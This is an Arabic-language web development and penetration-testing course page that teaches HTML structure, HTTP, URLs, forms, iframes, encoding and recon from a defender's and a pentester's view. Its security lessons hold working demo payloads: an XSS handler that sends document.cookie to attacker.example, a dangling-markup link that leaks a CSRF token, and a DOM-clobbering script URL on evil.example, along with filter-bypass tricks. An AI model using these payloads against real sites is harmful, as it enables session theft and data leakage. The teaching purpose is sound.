ليه الويب؟ ومن زاويتين: المطوّر والـ Pentester

أي web application — بنك، متجر، لوحة admin، حتى تطبيقات الـ desktop المبنية بـ Electron — بتوصل للمستخدم في الآخر على شكل HTML وCSS وJavaScript بيشغّلهم المتصفح. الكورس ده هيخليك مطوّر ويب محترف يبني مواقع وبرامج حقيقية — وفي نفس الوقت Pentester بيشوف حاجات الناس مش شايفاها: input بيتحط في مكان غلط، فورم بتبعت أكتر من اللي باين، comment نسيه المطوّر، أو صفحة phishing بتبني ملف malware جوه المتصفح نفسه.

🧱

تبني أي واجهة

مواقع، dashboards، صفحات هبوط، تطبيقات ويب كاملة — بـ HTML نضيف وsemantic، CSS بيعمل أي layout، وJavaScript بيكلم APIs.

⚙️

أساس أي software حديث

نفس الـ HTML/CSS/JS بيبني تطبيقات desktop (Electron)، وموبايل (WebViews وReact Native)، وextensions، وأدوات داخلية. والـ JavaScript نفسها بتشتغل backend بـ Node.js.

🏆

شغل باحتراف

Accessibility، أداء، SEO، تنظيم مشروع، Git، نشر — والكود الآمن من الأول: المطوّر اللي فاهم الهجمات بيكتب كود محدش يقدر يكسره بسهولة.

🎯 كـ Pentester الأمن وتحليل الـ Malware

🎯

أكبر سطح هجوم

أغلب الـ targets في الـ pentest والـ bug bounty هي web apps. كل صفحة، كل فورم، كل parameter في الـ URL هو باب محتمل — والـ HTML هو الخريطة بتاعة الأبواب دي.

💉

الثغرات = فهم المتصفح

XSS وHTML injection وCSRF وclickjacking مش «payloads بتتحفظ». دي نتيجة مباشرة لطريقة الـ parsing والـ encoding والـ origins. اللي فاهم القواعد بيكتب الـ payload بنفسه لأي فلتر.

🔍

الـ Recon بيبدأ من الـ source

comments منسية، hidden inputs، endpoints مستخبية في ملفات JS، API keys، أرقام إصدارات… كل ده بيتقري من الـ source قبل ما تبعت request واحد «هجومي».

🦠

الـ Malware بيتكلم HTML

HTML smuggling، مرفقات phishing بامتداد .html و.svg، ملفات .hta، وJavaScript متشوّش (obfuscated). محلل الـ malware لازم يقراهم ويفكّهم من غير ما يشغّلهم على جهازه.

🛠️

هتكتب PoCs وأدوات

CSRF PoC، صفحة clickjacking، تقرير فيه proof بيشتغل، bookmarklet، وscripts بـ Node.js تأتمت شغلك. ده كله HTML وCSS وJS.

🧠

أساس لكل اللي جاي

Burp Suite، اختبار الـ APIs، الـ browser exploitation، تحليل تطبيقات Electron… كلها بتفترض إنك فاهم الويب من جوه. الكورس ده هو الأساس ده.

اقرا الفكرة

🏴

XSS Range ومهام التحليل

صفحات «ضعيفة» بكود سيرفر مكشوف (white-box) بتكسرها جوه sandboxed iframe، ومهام تقرا فيها source أو sample وتطلّع الإجابة.

جرّب دلوقتي: المثال ده صفحة login صغيرة. دوس Forgot password?، وبعدين اكتب أي username وpassword ودوس Login — وبص تحت المعاينة.

login.html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Shop — Login</title>
</head>
<body>
  <h2>Sign in</h2>

    <input name="pass" type="password" placeholder="password" required>

🎯
لاحظ أول حاجة «Pentester-ish»

الفورم بعتت csrf_token=a91f3c مع إن مفيش خانة باينة اسمها كده — ده input type="hidden". المستخدم مش شايفه، بس أنت شايفه في الـ source وفي الـ request، وتقدر تغيّره. القاعدة الذهبية: أي حاجة في المتصفح تحت سيطرة المستخدم.

الويب من جوه: المتصفح والسيرفر والـ HTTP

قبل أول tag، لازم الصورة الكبيرة تبقى واضحة: المتصفح بيبعت request، والسيرفر بيرد بـ response فيه HTML، والمتصفح بيحوّل الـ HTML ده لصفحة. كل ثغرة ويب هتقابلها هي في الآخر حاجة غلط في واحدة من المراحل دي — فلازم تعرفها مرحلة مرحلة.

إيه اللي بيحصل لما تكتب URL وتدوس Enter؟ الرحلة كاملة

شكل الـ HTTP request من جوه نص عادي!

HTTP/1.1 بروتوكول نصّي: الـ request حرفيًا شوية سطور. أول سطر هو الـ request line، بعده headers (كل واحد Name: value)، بعدين سطر فاضي، وبعده body اختياري.

📜
HTTP/2 وHTTP/3

المواقع الحديثة غالبًا بتستخدم HTTP/2 أو HTTP/3: نفس المعاني (methods، headers، status codes) بس متبعتة كـ binary frames مش نص، والـ request line بيتحول لـ pseudo-headers زي :method و:path و:authority. Burp وDevTools بيعرضوهم كأنهم HTTP/1.1 عشان تقراهم بسهولة — فالشكل النصي اللي فوق هو اللي هتشتغل بيه.

🎯
معلومة هتحتاجها في الـ CSRF

فورم HTML عادية تقدر تبعت GET وPOST بس (وmethod="dialog" اللي مبيبعتش request أصلًا). PUT وDELETE وPATCH محتاجين JavaScript (fetch)، والـ JavaScript بيخضع لقيود الـ CORS لو الطلب لموقع تاني. فـ endpoint بيقبل تغييرات بـ POST form عادي هو أول مكان تدوّر فيه على CSRF.

الـ Content-Type: نفس الـ bytes بمعنى مختلف

المتصفح مبيحكمش على الـ response من امتداد الملف في الـ URL. بيحكم من الـ Content-Type. نفس النص <script>alert(1)</script> لو رجع بـ text/html هيتنفّذ، ولو رجع بـ text/plain أو application/json هيتعرض كنص. لو الـ header مش موجود أصلًا، المتصفح بيعمل MIME sniffing (بيخمّن من المحتوى) — وده اتاستغل كتير زمان، والحماية منه header اسمه X-Content-Type-Options: nosniff.

HTTP/1.1 200 OK
Content-Type: text/html

<script>alert(document.cookie)</script>

لو السيرفر بيحدد الـ type من المحتوى أو من غير قواعد، رفع «صورة» فيها HTML ممكن يبقى stored XSS.

HTML · الدرس 02

أول صفحة: الهيكل والـ Syntax

HTML = HyperText Markup Language: لغة توصيف مش لغة برمجة. مفيهاش متغيرات ولا loops؛ فيها «علامات» (tags) بتقول للمتصفح «ده عنوان، ده لينك، دي فورم». في الدرس ده هتبني أول صفحة صح 100%، وهتعرف القواعد اللي المتصفح بيقرا بيها — والحاجات اللي بيسامح فيها (وده بالظبط اللي المهاجم بيستغله).

تشريح الـ element

أصغر مستند HTML صحيح

index.html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Recon Notes</title>
</head>
<body>
  <h1>Target: shop.example</h1>
  <p>Scope: <b>*.shop.example</b> — authorized until Dec 31.</p>
</body>
</html>
السطروظيفته
<!DOCTYPE html>مش tag؛ ده إعلان بيقول للمتصفح «اشتغل بـ standards mode». لازم يبقى أول حاجة في الملف. لاحظ الـ badge في المعاينة: standards.
<html lang="en">الـ root element — كل حاجة جواه. الـ lang بيقول لغة المحتوى (لقارئات الشاشة والترجمة والخطوط). للعربي: lang="ar" dir="rtl".
<head>معلومات عن الصفحة مش بتتعرض: الـ encoding، العنوان، الـ CSS، الـ scripts، الـ meta tags.
<meta charset="UTF-8">الـ bytes دي تتقري إزاي. لازم يبقى في أول 1024 byte من الملف. من غيره ممكن العربي يطلع «Ø§Ù„…» (mojibake) — والأخطر إن اختلاف الـ encoding ممكن يكسر الحمايات (الدرس 14).
<meta name="viewport" …>عشان الموبايل يعرض الصفحة بعرضه الحقيقي بدل ما يصغّر صفحة desktop.
<title>اسم الـ tab والـ bookmark ونتيجة البحث. إجباري في المستند الصحيح.
<body>كل اللي بيتعرض للمستخدم.

الـ DOCTYPE وquirks mode

زمان قبل المعايير، كل متصفح كان بيرسم الصفحات بطريقته. لما المعايير جت، المتصفحات احتفظت بالسلوك القديم عشان المواقع القديمة متبوظش: لو الصفحة مفيهاش DOCTYPE، المتصفح بيدخل quirks mode ويقلّد سلوك متصفحات التسعينات في الـ CSS والـ layout. شغّل المثال وبص على الـ badge:

no-doctype.html
<html>
<head><title>No doctype</title></head>
<body>
  <p>This page has no DOCTYPE.</p>
  <script>
    // "BackCompat" = quirks mode, "CSS1Compat" = standards mode
    console.log("document.compatMode =", document.compatMode);
  </script>
</body>
</html>
💡
القاعدة

أول سطر في أي صفحة تكتبها: <!DOCTYPE html>. الحروف مش فارقة (<!doctype html> نفس الحاجة)، والـ DOCTYPEs الطويلة بتاعة HTML 4 وXHTML ملهاش لازمة في أي مشروع جديد. 🎯 لما تلاقي موقع شغّال quirks mode، ده غالبًا كود قديم — ودي إشارة إن باقي الـ stack قديم برضه.

الـ Nesting: الصفحة شجرة

الـ elements بتتداخل جوه بعض، والنتيجة شجرة: html هو الجذر، وأولاده head وbody، وهكذا. المصطلحات اللي هتسمعها طول الوقت: parent (الأب)، child (ابن مباشر)، sibling (أخ — نفس الأب)، descendant (أي حد تحته)، ancestor (أي حد فوقه). القاعدة الذهبية: اللي يتفتح آخر يتقفل الأول.

✅ صح
<p>This is <b>very <i>important</i></b>.</p>
❌ غلط (misnested)
<p>This is <b>very <i>important</b></i>.</p>

المتصفح مش هيوقف — هيصلّحها بخوارزمية اسمها adoption agency وممكن ينتج DOM مختلف عن اللي في دماغك (الدرس 13).

الـ Void elements: مالهاش end tag

شوية elements مينفعش يبقى ليهم محتوى، فمالهمش end tag خالص: area base br col embed hr img input link meta source track wbr. ممكن تكتب <br> أو <br/> — الاتنين نفس الحاجة، والـ / في HTML ملهاش أي معنى (موجودة عشان التوافق مع XHTML بس).

⚠️
فخ: <div/> مش «div فاضي»

بما إن الـ / متجاهلة في HTML، <div/> = <div> مفتوح! أي حاجة بعده هتبقى جواه. (الاستثناء الوحيد: جوه <svg> و<math> الـ self-closing بيشتغل فعلًا — ودي «foreign content».) شغّل ودوس 🌳 DOM:

self-closing.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Trap</title></head>
<body>
  <div/>First
  <div/>Second
  <p>Where am I?</p>
  <svg width="40" height="20"><rect width="40" height="20" fill="#ff7a45"/><circle/></svg>
</body>
</html>

الـ Attributes بالتفصيل

  • الأسماء case-insensitive في HTML: HREF = href (المتصفح بيحوّلها small). القيم غالبًا case-sensitive.
  • الـ quotes: double "…" أو single '…' أو من غير quotes لو القيمة مفيهاش مسافات ولا " ' = < > `. القيمة من غير quotes بتخلص عند أول مسافة — مصدر كلاسيكي للثغرات.
  • Boolean attributes (disabled، required، checked، hidden…): وجودها = true، أيًّا كانت القيمة. disabled="false" = disabled! عشان تلغيها لازم تشيل الـ attribute كله.
  • Attribute مكرر: الأول هو اللي بيكسب والتاني بيتشال (parse error). 🎯 لو فلتر بيتشيك على آخر واحد والمتصفح بياخد الأول — عندك bypass.
attributes.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Attributes</title></head>
<body>
  <button disabled="false">I am still disabled</button>
  <input type="checkbox" checked="no"> still checked
  <p ID="first" id="second" CLASS=note>Duplicate id</p>
  <a href=/search?q=red shoes>unquoted value</a>
  <script>
    const p = document.querySelector("p");
    console.log("id =", p.id, "| class =", p.className);
    console.log("href attr =", document.querySelector("a").getAttribute("href"));
    console.log("extra attribute named:", document.querySelector("a").attributes[1].name);
  </script>
</body>
</html>

لاحظ في الـ console: الـ id طلع first (الأول كسب)، والـ href طلع /search?q=red بس، والكلمة shoes>… استنى، دقق: shoes اتحوّلت لـ attribute تاني اسمه shoes! تخيّل لو الكلمة دي جت من المستخدم وكانت onmouseover=alert(1) — ده بالظبط أساس attribute injection.

الـ Comments

<!-- أي نص هنا -->: المتصفح مش بيعرضه، بس موجود في الـ source عند أي حد يدوس Ctrl+U. مينفعش تتداخل (أول --> بتقفل).

🎯
الـ comments كنز recon

مطورين بيسيبوا في الـ comments: endpoints قديمة، أسماء موظفين، TODOs زي «remove test account before release»، versions، وأحيانًا credentials. أول حاجة بتعملها في أي صفحة: تدوّر على <!--. (في الدرس 15 هنعمل ده بشكل منهجي.)

المسافات (whitespace)

المتصفح بيـدمج أي مجموعة مسافات/أسطر جديدة/tabs في النص لمسافة واحدة عند العرض. عشان كده الـ indentation في الكود مبيأثرش على الشكل. لو عايز سطر جديد: <br>، ولو عايز المسافات تفضل زي ما هي: <pre>، ولو عايز مسافة «مبتتكسرش»: &nbsp;.

whitespace.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Whitespace</title></head>
<body>
  <p>many      spaces
     and
     new lines      collapse.</p>
  <p>line one<br>line two</p>
  <pre>pre    keeps
     every   space</pre>
</body>
</html>

بس خلّي بالك: الـ whitespace موجود في الـ DOM كـ #text nodes حتى لو مش باين. دوس 🌳 DOM في المثال وفعّل «إظهار الـ whitespace» — هتلاقي nodes من نوع ⏎·· بين الـ tags. ده مهم لما تكتب JavaScript بيتنقّل في الشجرة.

HTML متسامحة… جدًا

لو كتبت Python غلط، هيطلع error ويقف. HTML لأ: الـ parser عنده قواعد مفصّلة لـ كل غلطة ممكنة، وبيكمّل ويطلع شجرة. ده كويس للمستخدم (الصفحة بتظهر)، بس معناه إن:

  • غلطاتك مش هتظهرلك لوحدها — استخدم W3C Validator (validator.w3.org) أو تاب Elements عشان تشوف الـ DOM الحقيقي.
  • 🎯 المتصفح بيفهم حاجات «غريبة» كـ HTML صحيح: tag من غير مسافة قبل الـ attribute، / مكان المسافة، attribute من غير quotes… فلتر بيدوّر على «الشكل المثالي» للـ HTML هيتعدّى.

النصوص والمعنى والـ Entities

HTML مش بتقول «خلّي ده bold»؛ بتقول «ده مهم» أو «ده كود» أو «ده اختصار». المعنى ده (الـ semantics) بيقرا منه قارئ الشاشة ومحرك البحث والـ scrapers. وفي آخر الدرس أهم موضوع أمني فيه: الـ character references — إزاي تكتب < كنص من غير ما المتصفح يفتح tag، وده أساس الحماية من XSS.

العناوين: h1 → h6

الروابط والـ URLs: من فين لفين بالظبط؟

الـ «Hyper» في HyperText هو الروابط. والـ URL نفسه لغة صغيرة ليها parser وقواعد — والفرق بين اللي المطوّر فاكره واللي المتصفح بيعمله فعلًا هو مصدر ثغرات زي open redirect وbase hijacking وtabnabbing. في الدرس ده هتبقى تقرا أي URL زي المتصفح بالظبط.

الـ <a> والـ href

<a href="URL">نص اللينك</a>. الـ href هو الوجهة، والنص هو اللي المستخدم بيشوفه. النص والوجهة ملهمش علاقة ببعض — ممكن النص يقول bank.example واللينك يروح في حتة تانية خالص (أساس الـ phishing). عشان كده اتعلّم دايمًا تبص على الـ href الحقيقي (hover وشوف شريط الحالة، أو من الـ source).

💡
نص اللينك لازم يوصف الوجهة

«اضغط هنا» نص سيء: قارئ الشاشة بيعرض قايمة اللينكات لوحدها، فـ 10 لينكات اسمهم «اضغط هنا» ملهمش معنى. اكتب «تحميل تقرير نوفمبر (PDF)».

الـ Fragments والـ ids

أي عنصر عليه id="x" تقدر تعمله لينك بـ #x — المتصفح بيعمل scroll ليه من غير ما يطلب حاجة من السيرفر (و#top أو # بيطلعوك لأول الصفحة). الـ fragment ده للمتصفح بس: مبيظهرش في الـ request ولا في logs السيرفر. وفيه كمان text fragments في Chrome: #:~:text=كلمة بتعمل scroll وhighlight لكلمة في الصفحة.

🎯
ليه الـ fragment مهم أمنيًا؟

(1) بما إنه مبيتبعتش للسيرفر، الـ WAF والـ logs مبيشوفوش أي payload فيه. (2) لو JavaScript في الصفحة بياخد location.hash ويحطه في الـ DOM، يبقى عندك DOM XSS مايبانش في أي request. (3) الـ OAuth القديم (implicit flow) كان بيرجّع الـ access_token في الـ fragment.

زمان: لينك target="_blank" لموقع المهاجم كان بيدّي الصفحة الجديدة window.opener — فتقدر تعمل opener.location = "https://bank-login.example" وتغيّر الـ tab الأصلي لصفحة phishing وهو في الخلفية! المتصفحات الحديثة (Chrome 88+، Firefox 79+، Safari 12.1+) بقت تعتبر target="_blank" = noopener تلقائيًا. بس window.open() من JavaScript لسه بيدّي opener، والتطبيقات القديمة/الـ webviews ممكن تكون عرضة — فاكتب rel="noopener noreferrer" صراحة، وفي الـ pentest دوّر على الحالات اللي الـ opener فيها لسه موجود.

  • mailto: / tel: / sms:: بيفتحوا برنامج الإيميل أو الاتصال. في الـ mailto تقدر تحط ?subject= و&body= (percent-encoded).
  • javascript:: لما تدوس، الكود بيتنفّذ في سياق الصفحة الحالية. أي موقع بيسمح للمستخدم يحط «لينك الويبسايت بتاعه» من غير ما يتأكد من الـ scheme = stored XSS.
  • data:: المحتوى نفسه جوه الـ URL. المتصفحات الحديثة بتمنع إن صفحة تودّيك لـ data: URL في الـ tab الرئيسي (كان بيستخدم في الـ phishing)، بس data: لسه شغال في الصور والـ iframes وغيرها.

💡 تلميح

هيكلة الصفحة بالمعنى، والـ Global attributes

صفحة كلها <div> ممكن تبان حلوة، بس الآلة (قارئ الشاشة، محرك البحث، أداة الـ recon) مش فاهمة منها حاجة. في الدرس ده هتبني الهيكل بالعناصر اللي ليها معنى، وتتعرف على الـ attributes اللي ينفع تحطها على أي عنصر — ومنها حاجات «بريئة» زي id وdata-* وopen ليها استخدامات هجومية حقيقية.

div وspan: حاويات من غير معنى

<div> حاوية block (بتاخد سطر كامل، والعناصر بعدها تنزل تحت)، و<span> حاوية inline (بتقعد جوه السطر). الاتنين ملهمش أي معنى — بيستخدموا للتجميع والـ styling لما مفيش عنصر semantic مناسب. القاعدة: دوّر الأول على عنصر بمعنى، ولو مفيش، استخدم div/span.

<!DOCTYPE html>

<style>div{background:#fff1ea;border:1px dashed #ff7a45;margin:4px 0}span{background:#ede9fe;border:1px dashed #8b5cf6}</style></head>
<body>
  <div>div 1 (block)</div><div>div 2 (block)</div>
  <p>A paragraph with <span>span 1</span> and <span>span 2</span> inline.</p>
</body>
</html>

DOM Clobbering: لما الـ id يبقى متغير

لأسباب تاريخية، أي عنصر عليه id بيبقى متاح كـ property على window (لو مفيش متغير بنفس الاسم)، والفورمز والصور ليها أسماء على document. لو الـ JavaScript بتاع الموقع بيعتمد على متغير global ممكن «ميكونش متعرّف»، وإنت تقدر تحقن HTML (حتى من غير scripts) — تقدر تلبّس المتغير ده عنصر بتاعك:

  <!-- attacker-controlled HTML (a "harmless" bio: no scripts, no on* handlers) -->
  <a id="config" href="https://evil.example/payload.js">my site</a>

  <script>
    // the site's own code
    const src = window.config ? String(window.config) : "/static/default-widget.js";
    console.log("typeof window.config =", typeof window.config);
    console.log("widget script would load from:", src);
  </script>

الفورمز (2): الإرسال، الـ Encoding، والـ Validation… وإزاي بيتعدّوا

في الدرس ده هتعرف بالظبط بيحصل إيه من لحظة ما تدوس «Submit» لحد ما الـ request يطلع: الـ validation، الـ submit event، بناء البيانات، والـ encoding. وبعدها هنكسر كل ده: validation بيتشال في ثانية، form بتتخطف بزرار واحد، وJSON بيتبعت من فورم HTML عادية.

رحلة الـ submit

GET ولا POST؟

GET

البيانات في الـ URL: /search?q=shoes. بتتحفظ في الـ history والـ bookmarks وlogs السيرفر والـ proxies، وممكن تتسرّب في الـ Referer. مناسبة للبحث والفلترة (عمليات قراية). عمرها ما تبقى لـ passwords أو tokens.

POST

البيانات في الـ body. مبتتحفظش في الـ URL، ومناسبة لأي حاجة بتغيّر state (login، شراء، حذف). بس متفتكرش إنها «مخفية»: أي proxy أو DevTools بيشوفها، والـ HTTPS هو اللي بيحميها في الطريق.

⚠️

الـ iframes: صفحة جوه صفحة

<iframe> بيحط مستند كامل (بـ window وDOM وscripts بتوعه) جوه صفحتك: خرايط، فيديوهات، أزرار دفع، widgets. وده بيفتح أسئلة أمنية مهمة: مين يقدر يوصل لمين؟ إزاي تعزل كود مش موثوق؟ وإزاي موقع يخدع المستخدم يدوس على زرار في موقع تاني من غير ما يعرف (clickjacking)؟ — بالمناسبة، كل المعاينات في الكورس ده iframes معزولة.

مين يقدر يلمس مين؟ (Same-Origin Policy)

كل iframe ليه window منفصل. الأب يقدر يوصل للـ iframe بـ iframe.contentWindow، والـ iframe يوصل لأبوه بـ window.parent وللأعلى بـ window.top. بس: لو الاتنين من نفس الـ origin بس يقدروا يقروا ويعدّلوا DOM بعض. لو من origins مختلفة، الـ Same-Origin Policy بتمنع القراية تمامًا، والمسموح بس حاجات محدودة: تغيير الـ location (navigation) وتبادل رسائل بـ postMessage.

allow-scripts + allow-same-origin = sandbox ملوش لازمة

لو المحتوى اللي جوه الـ iframe من نفس الـ origin بتاع الصفحة، والـ sandbox فيه الاتنين مع بعض، الـ script جواه يقدر يوصل لـ parent.document، يمسك عنصر الـ iframe نفسه، ويـشيل الـ sandbox attribute ويعمل reload — هروب كامل. القاعدة: كود مش موثوق = allow-scripts من غير allow-same-origin (زي معاينات الكورس ده: sandbox="allow-scripts allow-forms")، أو تخدمه من دومين منفصل خالص.

srcdoc = XSS بالـ entities

قيمة srcdoc attribute، فالـ entities جواها بتتفك، وبعدين الناتج بيتقري كـ HTML كامل. يعني <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"> بيشغّل script — وبما إن الـ srcdoc من غير sandbox بياخد origin الصفحة الأب، الـ script يقدر يقرا parent.document.cookie. فلتر بيمنع <script كنص بس، وبيسمح بـ iframe وsrcdoc، هيتخدع.

الجودة: Accessibility وValidation وSEO والأداء

الصفحة الاحترافية مش «شكلها حلو» وبس: شغّالة بالكيبورد، قارئ الشاشة فاهمها، محركات البحث فاهماها، وسريعة. وكل ده بيرجع لنفس الفكرة: HTML بمعنى صحيح. وفي الآخر هنشوف إزاي الـ malware بيستغل نفس الأدوات دي (SEO spam وcloaking).

الـ Accessibility tree

المتصفح بيبني من الـ DOM شجرة تانية اسمها accessibility tree: لكل عنصر مهم role (زرار؟ لينك؟ عنوان؟) وname (اسمه إيه؟) وstate (مفتوح؟ متعلّم عليه؟). قارئ الشاشة (NVDA، VoiceOver، TalkBack) بيقرا الشجرة دي. العناصر الـ semantic بتدّي كل ده ببلاش: <button> = role button + focusable + بيشتغل بـ Enter وSpace. الـ <div onclick> مفيهوش أي حاجة من دول. جرّب بالكيبورد (Tab ثم Enter):

الكيبورد والـ focus

  • كل حاجة تفاعلية لازم توصلها بـ Tab وتشغّلها بـ Enter/Space. العناصر الأصلية (a[href]، button، input…) بتعمل كده لوحدها.
  • ترتيب الـ Tab = ترتيب الـ DOM. tabindex="0" يضيف عنصر للترتيب، -1 focusable بالكود بس، والموجب ممنوع عمليًا (بيبوّظ الترتيب).
  • الـ focus لازم يبقى باين (متعملش outline: none من غير بديل).
  • «Skip link» أول حاجة في الصفحة: <a href="#main">Skip to content</a>.

الـ Encoding والـ Contexts: نفس الحرف بخمس لغات

الصفحة الواحدة فيها كذا «لغة» جوه بعض: HTML، وجواها URLs، وJavaScript، وCSS. كل لغة ليها حروفها الخطيرة وطريقة الـ escaping بتاعتها، والمتصفح بيفك الطبقات دي بترتيب معين. لو فهمت الترتيب ده، هتعرف ليه encoding معيّن بيحمي في مكان وبيفشل في مكان تاني — وهتعرف تفك أي obfuscation في sample خبيث.

الشبكة بتنقل bytes، والمتصفح لازم يعرف يحوّلها حروف إزاي. UTF-8 هو المعيار: الحروف الإنجليزية byte واحد (متوافق مع ASCII)، والعربي 2 bytes، والـ emoji 4. المتصفح بيحدد الـ encoding بالأولوية دي:

2

الـ HTTP header

Content-Type: text/html; charset=utf-8

3

الـ meta

<meta charset="UTF-8"> في أول 1024 byte.

4

التخمين

لو مفيش أي حاجة: sniffing أو default حسب لغة النظام (غالبًا windows-1252).

لو الـ encoding غلط بيحصل «mojibake»: كلمة السر بـ UTF-8 هي الـ bytes D8 A7 D9 84 D8 B3 D8 B1، ولو اتقرت كـ windows-1252 تطلع Ø§Ù„Ø³Ø±. لما تشوف Ø وÙ كتير في نص = عربي UTF-8 اتقري غلط.

Double encoding والـ normalization

  • Double encoding: %253C = %3C بعد decode واحد = < بعد التاني. لو الفلتر بيفك مرة والتطبيق مرتين (أو proxy في النص بيفك) = bypass.
  • Decode بعد الـ validation: أي تحويل بيحصل بعد الفحص (URL-decode، HTML-decode، Base64، lowercase) ممكن يرجّع الحرف الخطير. الترتيب الصح: normalize/decode الأول، validate، وencode وقت الإخراج.
  • Unicode normalization: الـ NFKC بيحوّل ＜ (fullwidth U+FF1C) لـ <. تطبيق بيفلتر وبعدين يعمل normalize = ＜script＞ بقت <script>. وكمان الـ case mapping: "ſ".toUpperCase() = "S".
  • Homoglyphs: а (سيريلي) شبه a — في الدومينات (IDN) وفي أسماء المستخدمين.

Recon من الـ HTML والـ JavaScript

قبل أي payload، الـ pentester المحترف بيرسم خريطة سطح الهجوم: كل صفحة، كل parameter، كل endpoint، كل host، وكل حاجة «مكنش المفروض تبقى هنا». وأغلب الخريطة دي موجودة في الكود اللي السيرفر بيبعته لك بنفسه. في الدرس ده هنحوّل كل اللي اتعلمته لمنهجية بتمشي عليها في أي target.

⚖️
Scope أولًا

الـ recon «السلبي» (قراية اللي السيرفر بيبعته، Wayback، البحث) مختلف عن الـ scanning النشط. حتى في الـ bug bounty، الـ subdomains والـ hosts اللي هتلاقيها مش بالضرورة في الـ scope. اقرا الـ policy واشتغل جواها بس.

المنهجية خطوة خطوة

01

اتصفح كمستخدم وBurp شغّال

اعمل حساب، جرّب كل feature (بحث، رفع، دفع، إعدادات). Burp بيبني Site map بكل request. ده أساس كل حاجة بعد كده.

02

اقرا الـ source لكل «نوع» صفحة

view-source: للـ HTML الخام، وتاب Elements للـ DOM بعد الـ JS. دوّر على: <!--، type="hidden"، hidden/disabled، data-*.

03

الفورمز

كل action وmethod وكل name (بما فيها الـ hidden). فيه CSRF token؟ فيه parameters بتتحكم في حاجة حساسة (price، role، user_id، debug، return)؟

04

كل URL في الصفحة

href، src، action، formaction، srcset، CSS url(): الـ paths بتكشف directories، والـ hosts بتكشف subdomains وخدمات خارجية، وmailto: بتكشف إيميلات.

05

ملفات الـ JavaScript

أغنى مصدر: كل fetch/axios/XMLHttpRequest = endpoint، routes الـ SPA (حتى صفحات admin)، feature flags، شروط صلاحيات بتتعمل في المتصفح، وأحيانًا secrets. ودوّر على //# sourceMappingURL=.

06

البصمة التقنية

meta generator، أرقام الإصدارات في أسماء الملفات والـ query (?ver=)، الـ headers (Server، X-Powered-By)، الـ cookies (PHPSESSID، JSESSIONID، ASP.NET_SessionId).

07

الملفات المعروفة

/robots.txt، /sitemap.xml، /.well-known/security.txt (للتواصل الرسمي)، /manifest.json، /crossdomain.xml، وأحيانًا exposures زي /.git/HEAD أو .env أو backup.zip (اختبارها نشط — في الـ scope بس).

08

الماضي

Wayback Machine (web.archive.org) فيه نسخ قديمة من الصفحات وملفات JS — endpoints اتشالت من الواجهة بس ممكن لسه شغّالة في السيرفر.

لو input المستخدم وصل للصفحة في مكان المتصفح بيفسّره فيه كـ markup أو كود، يبقى عندك injection. لو قدرت تشغّل JavaScript، اسمها Cross-Site Scripting (XSS) — كودك بيشتغل جوه origin الموقع، بصلاحيات الضحية. الدرس ده بيجمع الـ parser والـ contexts والـ encoding في منهجية واحدة، وبعدها XSS Range من 13 مستوى تكسرهم بنفسك جوه sandbox.

الـ Impact عمليًا: إيه اللي الـ payload شايفه؟

الصفحة دي «السيرفر» بتاعها حط 3 cookies: session (عليها HttpOnly)، وtheme، وlang. الـ payload المحقون بيقرا document.cookie ويحاول يبعتها لسيرفر المهاجم (الـ sandbox مانع أي network، فمحدش هيستلم حاجة):

impact.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Profile</title></head>
<body>
  <!-- the server reflected the "name" parameter here, unencoded: -->
  <p>Profile of: <img src=x onerror="console.log('document.cookie =', JSON.stringify(document.cookie)); new Image().src='https://attacker.example/c?d='+encodeURIComponent(document.cookie);"></p>
</body>
</html>

الـ session مش ظاهرة — ده دور HttpOnly. بس متفتكرش إن ده يقفل الـ XSS: الكود لسه يقدر يعمل fetch("/account/email", {method:"POST", …}) والمتصفح يلزق الـ session cookie لوحده. HttpOnly بيقلل الـ impact مش بيلغيه.

HTML injection من غير JavaScript

حتى لو الـ JS ممنوع خالص (CSP قوي، أو فلتر بيشيل كل الـ handlers)، حقن HTML لوحده ليه impact:

📝

Content spoofing

رسالة مزيفة على موقع موثوق: «حسابك موقوف، كلّم الرقم ده».

🪝

Form/base hijacking

formaction على زرار، <form> مفتوحة قبل فورم حقيقية، أو <base href> قبل scripts (الدروس 04 و09 و13).

🧹

DOM clobbering

id/name بتلبس متغيرات الـ JS (الدرس 07).

💧

Dangling markup

attribute متفتحش اتقفل «بيبلع» باقي الصفحة لحد أول quote — ومعاه tokens سرية — ويبعتها في URL.

جرّب الـ dangling markup: المهاجم حقن <a href='https://attacker.example/log?d= بس (من غير ما يقفل الـ quote). الـ href «بلع» الفورم اللي بعده لحد أول ' في الصفحة. دوس على اللينك (الكلام اللي بعد الفورم) وبص على الـ URL:

dangling.html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Account</title></head>
<body>
  <p>Hello <a href='https://attacker.example/log?d=</p>
  <form action="/transfer" method="post">
    <input type="hidden" name="csrf" value="9f8e7d6c5b4a">
    <button>Send money</button>
  </form>
  <p>Don't share your token. Click to continue.</p>
</body>
</html>
🎯
ليه dangling markup مهم؟

بيشتغل حتى مع CSP صارمة بتمنع كل الـ scripts، لأنه مش بيشغّل كود — بيستخدم سلوك HTML عادي (لينك/صورة/فورم) عشان يسرّب أسرار الصفحة (CSRF tokens، بيانات شخصية). نسخة الـ <img src='… بتسرّب أوتوماتيك من غير ضغطة (المتصفحات الحديثة بتمنع بعض الحالات، زي الـ URLs اللي فيها newline و< مع بعض، فالمهاجمين بيدوّروا على بدايل).

المنهجية: من الـ canary للـ payload

01

ابعت canary فريد

كلمة مش هتتكرر صدفة زي wm7x9z'"<> في كل parameter (URL، فورم، headers، الـ JSON).

02

دوّر عليه في الـ response

Burp → Search / Ctrl+F في الـ source. ممكن يظهر في أكتر من مكان — كل مكان context مختلف. ولو مظهرش: تابع الـ DOM (DOM XSS) وصفحات تانية (stored).

03

حدد الـ context

نص؟ attribute (بـ quotes ولا من غير)؟ URL؟ جوه script؟ جوه comment/textarea/title؟ (مصفوفة الدرس 14).

04

شوف إيه اللي اتعمله encode

هل ' و" و< و> رجعوا زي ما هما؟ اتشالوا؟ اتحولوا entities؟ ده بيقولك تقدر «تخرج» من الـ context ولا لأ.

05

